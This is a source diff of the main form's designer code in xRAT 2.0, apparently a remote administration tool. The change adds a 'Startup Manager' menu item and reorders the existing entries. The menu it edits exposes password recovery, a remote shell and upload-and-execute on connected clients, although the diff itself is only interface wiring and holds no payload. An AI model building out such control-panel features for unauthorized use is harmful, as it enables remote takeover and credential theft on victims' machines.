@@ -40,8 +40,9 @@ namespace xServer.Forms
             this.ctxtUninstall = new System.Windows.Forms.ToolStripMenuItem();
             this.ctxtSystem = new System.Windows.Forms.ToolStripMenuItem();
             this.ctxtSystemInformation = new System.Windows.Forms.ToolStripMenuItem();
-            this.ctxtTaskManager = new System.Windows.Forms.ToolStripMenuItem();
             this.ctxtFileManager = new System.Windows.Forms.ToolStripMenuItem();
+            this.ctxtStartupManager = new System.Windows.Forms.ToolStripMenuItem();
+            this.ctxtTaskManager = new System.Windows.Forms.ToolStripMenuItem();
             this.ctxtPasswordRecovery = new System.Windows.Forms.ToolStripMenuItem();
             this.ctxtRemoteShell = new System.Windows.Forms.ToolStripMenuItem();
             this.ctxtLine = new System.Windows.Forms.ToolStripSeparator();
@@ -60,7 +61,7 @@ namespace xServer.Forms
             this.botListen = new System.Windows.Forms.ToolStripStatusLabel();
             this.imgFlags = new System.Windows.Forms.ImageList(this.components);
             this.nIcon = new System.Windows.Forms.NotifyIcon(this.components);
-            this.lstClients = new ListViewEx();
+            this.lstClients = new xServer.Controls.ListViewEx();
             this.hIP = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
             this.hSocket = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
             this.hVersion = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
@@ -69,7 +70,7 @@ namespace xServer.Forms
             this.hCountry = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
             this.hOS = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
             this.hAccountType = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
-            this.mainMenu = new MainMenuEx();
+            this.mainMenu = new xServer.Controls.MainMenuEx();
             this.menuFile = new System.Windows.Forms.MenuItem();
             this.menuClose = new System.Windows.Forms.MenuItem();
             this.menuSettings = new System.Windows.Forms.MenuItem();
@@ -138,8 +139,9 @@ namespace xServer.Forms
             // 
             this.ctxtSystem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
             this.ctxtSystemInformation,
-            this.ctxtTaskManager,
             this.ctxtFileManager,
+            this.ctxtStartupManager,
+            this.ctxtTaskManager,
             this.ctxtPasswordRecovery,
             this.ctxtRemoteShell,
             this.ctxtLine,
@@ -157,14 +159,6 @@ namespace xServer.Forms
             this.ctxtSystemInformation.Text = "System Information";
             this.ctxtSystemInformation.Click += new System.EventHandler(this.ctxtSystemInformation_Click);
             // 
-            // ctxtTaskManager
-            // 
-            this.ctxtTaskManager.Image = ((System.Drawing.Image)(resources.GetObject("ctxtTaskManager.Image")));
-            this.ctxtTaskManager.Name = "ctxtTaskManager";
-            this.ctxtTaskManager.Size = new System.Drawing.Size(178, 22);
-            this.ctxtTaskManager.Text = "Task Manager";
-            this.ctxtTaskManager.Click += new System.EventHandler(this.ctxtTaskManager_Click);
-            // 
             // ctxtFileManager
             // 
             this.ctxtFileManager.Image = ((System.Drawing.Image)(resources.GetObject("ctxtFileManager.Image")));
@@ -172,6 +166,22 @@ namespace xServer.Forms
             this.ctxtFileManager.Size = new System.Drawing.Size(178, 22);
             this.ctxtFileManager.Text = "File Manager";
             this.ctxtFileManager.Click += new System.EventHandler(this.ctxtFileManager_Click);
+            // 
+            // ctxtStartupManager
+            // 
+            this.ctxtStartupManager.Image = global::xServer.Properties.Resources.startup_programs;
+            this.ctxtStartupManager.Name = "ctxtStartupManager";
+            this.ctxtStartupManager.Size = new System.Drawing.Size(178, 22);
+            this.ctxtStartupManager.Text = "Startup Manager";
+            this.ctxtStartupManager.Click += new System.EventHandler(this.ctxtStartupManager_Click);
+            // 
+            // ctxtTaskManager
+            // 
+            this.ctxtTaskManager.Image = ((System.Drawing.Image)(resources.GetObject("ctxtTaskManager.Image")));
+            this.ctxtTaskManager.Name = "ctxtTaskManager";
+            this.ctxtTaskManager.Size = new System.Drawing.Size(178, 22);
+            this.ctxtTaskManager.Text = "Task Manager";
+            this.ctxtTaskManager.Click += new System.EventHandler(this.ctxtTaskManager_Click);
             // 
             // ctxtPasswordRecovery
             // 
@@ -677,7 +687,7 @@ namespace xServer.Forms
             this.menuAbout.Text = "About";
             this.menuAbout.Click += new System.EventHandler(this.menuAbout_Click);
             // 
-            // frmMain
+            // FrmMain
             // 
             this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
             this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
@@ -688,7 +698,7 @@ namespace xServer.Forms
             this.ForeColor = System.Drawing.Color.Black;
             this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
             this.MinimumSize = new System.Drawing.Size(680, 415);
-            this.Name = "frmMain";
+            this.Name = "FrmMain";
             this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
             this.Text = "xRAT 2.0 - Connected: 0";
             this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.FrmMain_FormClosing);
@@ -747,6 +757,7 @@ namespace xServer.Forms
         private System.Windows.Forms.ToolStripMenuItem ctxtRestart;
         private System.Windows.Forms.ToolStripMenuItem ctxtStandby;
         private System.Windows.Forms.ToolStripMenuItem ctxtUploadAndExecute;
+        private System.Windows.Forms.ToolStripMenuItem ctxtStartupManager;
     }
 }
 
